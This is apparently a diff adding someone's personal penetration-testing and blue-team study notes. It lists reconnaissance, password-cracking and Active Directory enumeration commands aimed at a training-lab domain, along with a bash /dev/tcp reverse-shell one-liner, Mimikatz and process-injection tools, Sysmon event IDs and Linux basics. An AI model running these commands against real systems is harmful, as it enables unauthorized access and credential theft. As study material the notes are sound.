@@ -1,0 +1,189 @@
+Cybersecurity tools masterlist (no order):
+
+
+dehashed.py credential lookup
+
+viewdns.info
+
+hurrican electric BGP toolkit: researching what address blocks are assigned to an organization and what ASN they reside within.
+
+trufflehog/buckets.grayhatwarfare.com : bucket scanners for finding breadcrumbs in places like github, aws cloud storage, etc.
+
+cyberchef hash cracker
+
+burpsuite web request proxy
+
+nmap reconnaisance scanner / tcpdump
+	conceal as much asp:
+	sudo nmap -sC -sV -p- -oA <output filename> <ip>
+	sudo nmap -T4 -A -p- -oA <output filename> <ip> 
+
+thchydra/john the ripper/hashcat password cracker // hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt // hydra http-post-form -U
+
+google dorking: ex: filetype:pdf inurl:inlanefreight.com // intext:"@inlanefreight.com" inurl:inlanefreight.com
+
+linkedin2username: Generate username lists from companies on LinkedIn for cracking
+
+fping: generates a target list from a CIDR // ex: fping -asgq 172.16.5.0/23
+
+kerbrute - internal AD username enumeration // kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 <username list> -o valid_ad_users // kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+
+Responder: Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. // sudo responder -I ens224 
+
+Inveigh: Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.
+
+Metasploit:	Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.
+
+enum4linux, rpcclient, crackmapexec: to obtain a list of usernames // enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" // rpcclient -U "" -N 172.16.5.5 // crackmapexec smb 172.16.5.5 --users
+
+ldapsearch: Gathering Users with LDAP Anonymous // ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+	windapsearch: ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+
+
+DomainPasswordSpray.ps1: Password spraying from windows on a domain // https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1
+
+GTFObins
+
+More brute forcers: Ncrack, wfuzz, medusa, patator, hydra again
+
+Username-Anarchy: Username List generator // https://github.com/urbanadventurer/username-anarchy
+
+Cupp: Personal Info word list generator // https://github.com/Mebus/cupp
+
+Crackmapexec: password cracker for  other protocols such as SMB, LDAP, MSSQL, and others \\ crackmapexec winrm 10.129.62.220 -u username.list -p password.list
+
+Evil-WinRM: allows us to communicate with the WinRM service efficiently. \\ evil-winrm -i 10.129.42.197 -u user -p password
+
+metasploit msfconsole 
+
+payloadsAllTheThings - repository for payloads for "all the things"
+
+SSTI template - https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7O4Hp6bOFFkge_yq4G%2F-M7OCvxwZCiaP8Whx2fi%2Fimage.png?alt=media&token=4b40cf58-5561-4925-bc86-1d4689ca53d1 
+		    https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection // //pentesting template for server side template injection
+
+
+default bash reverse shell: "bash -c 'bash -i >& /dev/tcp/<hostIP>:<port> 0>&1'"
+					nc -nvlp <port>
+
+
+python http server basics: python3 -m http.server 80
+					 nc -nvlp 80
+
+
+$IFC == url encoded space sometimes 
+
+sqlmap - allows you to enumerate database features in blind sql, just need to specify parameters such as url, post/get data, cookie
+
+fciv - windows tool that allows you to fetch file information such as md5
+
+SoltraEdge - STIX/TAXII converter for information sharing on threats
+
+Terminal Emulators: such as GNOME Terminal, XFCE4 Terminal, XTerm, and many others replicate the terminal and usually include more functionality
+
+tool tips/help : man <tool name> | <tool name> -h --help
+
+uname (-a): prints all information about the machine in a specific order: kernel name, hostname, the kernel release, kernel version, machine hardware name, and operating system. The -a flag will omit -p (processor type) and -i (hardware platform) if they are unknown.
+
+xfreerdp: rdp client for linux sided authentication | 
+
+Linux Service and Process management:  PS -list/tree | systemctl | journalctl | jobs | bg\fg | numeral sig(variant) | "; &&" ordering
+
+Text Editors: Nano, Vim, VimTutor
+
+Finding/Locating in Linux: 
+	 which <program name>
+	 find <location><options> : find / -type f -name *.conf -user root -size +20k -newermt 2020-03-03 -exec ls -al {} \; 2>/dev/null
+	 locate <file name>
+
+
+Browser DevTools: inspect element ? network tab allows us to invesitage requests with headers and other pertinent info
+			edit and resend doubles down and allows for cntl+c of easy info to be grabbed for parameters in other tools
+
+icacls: list out the NTFS permissions on a specific directory | 
+    (CI): container inherit
+    (OI): object inherit
+    (IO): inherit only
+    (NP): do not propagate inherit
+    (I): permission inherited from parent container
+
+SysInternals Tools suite: a set of portable Windows applications that can be used to administer Windows systems (for the most part without requiring installation) | \\live.sysinternals.com\tools -accepteula
+
+Microsoft Management Console: MMC can be used to group snap-ins, or administrative tools, to manage hardware, software, and network components within a Windows host.
+
+ELK Stack ( elasticsearch, logstash, kibana + beats)
+	elasticsearch indexs data that is fed to it from various sources (logstash, beats, direct integration). transform, query, search
+	logstash is the primary vacuum that helps gather and initially sort data from endpoints, feeding it into elasticsearch
+	kibana is a gui interface that allows for way easier visualization of data returned from elasticsearch results
+	beats - small programs that can capture specific data from a source without needing a full logstash configuration
+
+Sysmon - system monitor,  enhanced logging system service and device driver that remains resident across system reboots to monitor and log system activity to the Windows event log. enhanced through additional configuration files.
+	
+    Sysmon Event ID 1 - Process Creation: Useful for hunts targeting abnormal parent-child process hierarchies, as illustrated in the 	first lesson with Process Hacker. It's an event we can use later.
+    Sysmon Event ID 2 - A process changed a file creation time: Helpful in spotting "time stomp" attacks, where attackers alter file 	creation times. Bear in mind, not all such actions signal malicious intent.
+    Sysmon Event ID 3 - Network connection: A source of abundant noise since machines are perpetually establishing network connections. We 	may uncover anomalies, but let's consider other quieter areas first.
+    Sysmon Event ID 4 - Sysmon service state changed: Could be a useful hunt if attackers attempt to stop Sysmon, though the majority of 	these events are likely benign and informational, considering Sysmon's frequent legitimate starts and stops.
+    Sysmon Event ID 5 - Process terminated: This might aid us in detecting when attackers kill key processes or use sacrificial ones. For 	instance, Cobalt Strike often spawns temporary processes like werfault, the termination of which would be logged here, as well as 	the creation in ID 1.
+    Sysmon Event ID 6 - Driver loaded: A potential flag for BYOD (bring your own driver) attacks, though this is less common. Before 	diving deep into this, let's weed out more conspicuous threats first.
+    Sysmon Event ID 7 - Image loaded: Allows us to track dll loads, which is handy in detecting DLL hijacks.
+    Sysmon Event ID 8 - CreateRemoteThread: Potentially aids in identifying injected threads. While remote threads can be created 	legitimately, if an attacker misuses this API, we can potentially trace their rogue process and what they injected into.
+    Sysmon Event ID 10 - ProcessAccess: Useful for spotting remote code injection and memory dumping, as it records when handles on 	processes are made.
+    Sysmon Event ID 11 - FileCreate: With many files being created frequently due to updates, downloads, etc., it might be challenging to 	aim our hunt directly here. However, these events can be beneficial in correlating or identifying a file's origins later.
+    Sysmon Event ID 12 - RegistryEvent (Object create and delete) & Sysmon Event ID 13 - RegistryEvent (Value Set): While numerous events 	take place here, many registry events can be malicious, and with a good idea of what to look for, hunting here can be fruitful.
+    Sysmon Event ID 15 - FileCreateStreamHash: Relates to file streams and the "Mark of the Web" pertaining to external downloads, but 	we'll leave this aside for now.
+    Sysmon Event ID 16 - Sysmon config state changed: Logs alterations in Sysmon configuration, useful for spotting tampering.
+    Sysmon Event ID 17 - Pipe created & Sysmon Event ID 18 - Pipe connected: Record pipe creations and connections. They can help observe 	malware's interprocess communication attempts, usage of PsExec, and SMB lateral movement.
+    Sysmon Event ID 22 - DNSEvent: Tracks DNS queries, which can be beneficial for monitoring beacon resolutions and DNS beacons.
+    Sysmon Event ID 23 - FileDelete: Monitors file deletions, which can provide insights into whether a threat actor cleaned up their 	malware, deleted crucial files, or possibly attempted a ransomware attack.
+    Sysmon Event ID 25 - ProcessTampering (Process image change): Alerts on behaviors such as process herpadering, acting as a mini AV 	alert filter.
+
+
+ProcessHacker- application that can identify managed services such as powershell or items dependent on C# with a runtime environment. 
+
+PSInject - injects powershell into any process
+
+MimiKatz - credential dumping tool that can dump plaintexthashed pwds by accessing local security authority subsystem service (LSASS).
+
+Stephen Fewer's DLL GitHub: provides dlls that can be injected into directories that native processes can call. "Reflective DLL injection is a library injection technique in which the concept of reflective programming is employed to perform the loading of a library from memory into a host process" https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows
+
+ETW: event tracing for windows: high speed general purpose high speed tracing facility provided by Windows. collects various events and analyzes them. system calls, process creation/termination, registryfile mods, etc seamless integration w event providers. PS Get-WinEvent
+
+Windows XML Event Log (EVTX) format library: https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc
+
+githubusercontent.com is utilized as a hosting platform for attacker payloads based on default whitelisting.
+
+
+
+
+
+File System Heirarchy Linux : / 	The top-level directory is the root filesystem and contains all of the files required to boot the operating system before other filesystems are mounted as well as the files required to boot the other filesystems. After boot, all of the other filesystems are mounted at standard mount points as subdirectories of the root.
+					/bin 	Contains essential command binaries.
+					/boot 	Consists of the static bootloader, kernel executable, and files required to boot the Linux OS.
+					/dev 	Contains device files to facilitate access to every hardware device attached to the system.
+					/etc 	Local system configuration files. Configuration files for installed applications may be saved here as well.
+					/home 	Each user on the system has a subdirectory here for storage.
+					/lib 	Shared library files that are required for system boot.
+					/media 	External removable media devices such as USB drives are mounted here.
+					/mnt 	Temporary mount point for regular filesystems.
+					/opt 	Optional files such as third-party tools can be saved here.
+					/root 	The home directory for the root user.
+					/sbin 	This directory contains executables used for system administration (binary system files).
+					/tmp 	The operating system and many programs use this directory to store temporary files. This directory is generally cleared upon system boot and may be deleted at other times without any warning.
+					/usr 	Contains executables, libraries, man files, etc.
+					/var 	This directory contains variable data files such as log files, email in-boxes, web application related files, cron files, and more.
+
+ls -l /dir/file
+
+- rwx rw- r--   1 root root 1641 May  4 23:42 /etc/passwd
+- --- --- ---   |  |    |    |   |__________|
+|  |   |   |    |  |    |    |        |_ Date
+|  |   |   |    |  |    |    |__________ File Size
+|  |   |   |    |  |    |_______________ Group
+|  |   |   |    |  |____________________ User
+|  |   |   |    |_______________________ Number of hard links
+|  |   |   |_ Permission of others (read)
+|  |   |_____ Permissions of the group (read, write)
+|  |_________ Permissions of the owner (read, write, execute)
+|____________ File type (- = File, d = Directory, l = Link, ... )
+
+chmod, chown 
+
